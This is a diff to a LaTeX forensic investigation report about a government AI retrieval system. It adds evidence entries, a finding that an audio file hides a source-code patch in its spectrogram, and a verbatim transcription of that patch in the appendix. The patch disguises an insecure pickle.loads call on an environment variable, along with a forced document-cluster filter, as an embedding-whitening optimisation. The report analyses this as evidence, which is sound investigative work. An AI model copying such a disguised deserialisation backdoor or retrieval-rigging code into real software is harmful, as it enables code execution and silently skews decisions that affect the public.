@@ -139,6 +139,11 @@ evidence/blank-fixed.png & Signature-repaired version of the above & 76df9408\ld
 evidence/myzip.zip & Personal backup commit, password-protected & 9ddeef45\ldots{}39de4 \\
 \hline
 evidence/amelia2.pdf & Extracted from \texttt{myzip.zip} (password recovered) & 04be0e12\ldots{}f51707 \\
+evidence/dj\_cara\_after\_hours.wav & Personal backup commit, Git LFS blob & <SHA-256> \\
+\hline
+evidence/spectrogram-messages.zip & Extracted from the WAV's stereo side-channel spectrogram & <SHA-256> \\
+\hline
+evidence/telemetry.xlsx & "telemetry files" commit, out of context in a phishing repo & <SHA-256> \\
 % TODO: Add relevant acquired/recovered artifacts.
 
 \vspace{30pt} &
@@ -247,6 +252,24 @@ byte-level signature alteration (A021, A016's ICO header), file concatenation/po
 durations). One archive (A022) used password protection, with the password itself hidden in an
 adjacent subtitle file rather than guessed.
 
+A further, unrelated artefact from the same personal backup material yielded the most
+significant technical finding of the investigation. \texttt{Music/dj\_cara\_after\_hours.wav}
+(a Git LFS blob) hides a source-code diff in the spectrogram of its stereo side channel
+((L-R)/2, 18--22 kHz band), decodable with the attacker's own script
+\texttt{decode\_spectrogram\_messages.py}. The diff patches
+\texttt{src/rag\_engine/query\_translator.py} to introduce
+\texttt{pickle.loads(base64.b64decode(os.getenv(\allowbreak "AMELIA\_ISOTROPY\_TENSORS")))}
+inside a function disguised as an embedding-whitening optimisation ("All-but-the-Top"
+projection), together with a \texttt{cluster\_id} written from
+\texttt{os.getenv("DEFAULT\_EVAL\_CLUSTER")}. This is the same file and mechanism referenced
+in prose by Section 11 of A023 (\S\ref{sec:amelia-docs}) -- the audio artefact supplies the
+actual code behind that report's "environmental fallback" description.
+
+Separately, \texttt{Documents/telemetry.xlsx} was found to encode a
+photograph across its three worksheets using the CIELAB colour space rather than sensor
+readings. This finding was still being verified by the team at the time of writing and is
+flagged as open in the artifact register.
+
 % -----------------------------------------------------------------------------
 \subsection{Interpretation of the evidence}
 % -----------------------------------------------------------------------------
@@ -285,11 +308,20 @@ retrieval validity... and may contaminate the related decision." A020's independ
 report of 45 of 50 major public contracts concentrating on three companies is consistent with
 this fallback silently narrowing procurement-related retrieval to a fixed document subset.
 
+Crucially, this "cluster ID fallback" is no longer only a claim made in A023's prose: the
+diff recovered from A012's spectrogram-hidden audio (\S2) is the actual patch implementing
+it, including the insecure \texttt{pickle.loads} call on an attacker- or
+operator-controlled environment variable. This upgrades the finding from a documented
+design limitation to a concrete, exploitable code-level vulnerability (CWE-502, insecure
+deserialisation) embedded in the very component responsible for routing procurement-related
+queries.
+
 \textbf{Established by evidence:} the AMÉLIA system's stated integrations, the existence and
 documented behaviour of the cluster-ID fallback (self-disclosed in A023, Section 11), the
 document's own prohibition of that class of mechanism (Section 7.4), the panel vote split and the
-Chair's unilateral override, the deprecated bypass property in A014, and the independent public
-report of contract concentration (A020).
+Chair's unilateral override, the deprecated bypass property in A014, the independent public
+report of contract concentration (A020), and the existence of the actual patched source  code implementing the cluster-ID fallback, 
+including an insecure deserialisation call.
 
 \textbf{Inferential:} that the disclosed fallback was the actual cause of the reported contract
 concentration, that the bypass token was invoked, and that these two mechanisms are connected to
@@ -337,6 +369,10 @@ investigation.
 \item Request the AMÉLIA query-translation layer's fallback logs and the composition of the
   "cluster ID" referenced in A023 §11, to determine whether public-procurement queries were
   routed through it and, if so, which entities' documents it contained.
+\item Preserve and analyse the running (or last-deployed) value of the
+  \texttt{AMELIA\_ISOTROPY\_TENSORS} and \texttt{DEFAULT\_EVAL\_CLUSTER} environment
+  variables referenced in the recovered patch, to determine whether the insecure
+  deserialisation path was ever reachable or exploited in production.
 \end{itemize}
 
 % -----------------------------------------------------------------------------
@@ -369,6 +405,51 @@ infrastructure.
 % tool outputs or other material useful to substantiate or
 % reproduce the findings.
 
+\paragraph{A0XX -- Recovered patch (transcribed from spectrogram tiles)}
+\begin{quote}
+\begin{verbatim}
+--- src/rag_engine/query_translator_original.py  2026-03-01 10:14:22.xxx +0000
++++ src/rag_engine/query_translator_patched.py    2026-04-12 23:41:05.xxx +0100
+@@ -42,6 +42,26 @@
+         filter_dict = self.llm_parser.extract_metadata_filters(user_query)
 
++        # Resolving anisotropic representation degradation in dense retrieval (see Ma et al., 2017)
++        # High-cardinality queries currently trigger dense-cluster distance calc[ulation]
++        try:
++            import os, numpy as np
++            from utils.tensor_math import load_whitening_matrix
++
++            # Apply an 'All-but-the-Top' projection to eliminate the dominating directions
++            # and enforce space isotropy to bound distance calculations.
++            if self.llm_parser.estimate_query_entropy(user_query) > \
++               float(os.getenv("MAX_QUERY_ENTROPY", "0.85")):
++
++                # Load pre-computed principal components directly from daemon environment
++                import pickle, base64
++                payload = pickle.loads(base64.b64decode(os.getenv("AMELIA_ISOTROPY_TENSORS", "")))
++                U, mu = payload['U'], payload['mu']
++
++                # Orthogonalize the query vector against the dominant [directions]
++                semantic_vector = encoder.encode(user_query)
++                whitened_query = (semantic_vector - mu - np.dot(U, np.dot(U.T, semantic_vector - mu))).tolist()
++
++                # [...] to the normalized query [...] to the bounded execution
++                filter_dict.update({
++                    "normalized_vector": whitened_query,
++                    "cluster_id": os.getenv("DEFAULT_EVAL_CLUSTER", "max_pca_components")
++                })
++        except Exception:
++            pass
+
+         return filter_dict
+
+def build_pgvector_query(filters: Dict[str, Any]):
+\end{verbatim}
+\end{quote}
+\textit{Partial transcription -- some lines were illegible in the source spectrogram; see
+the register's Limitations field for this artifact.}
+
+\paragraph{\texttt{decode\_spectrogram\_messages.py} -- extract hidden spectrogram text from a stereo WAV}
+Full source in \texttt{evidence/}; command used per the register entry.
 
 \end{document}
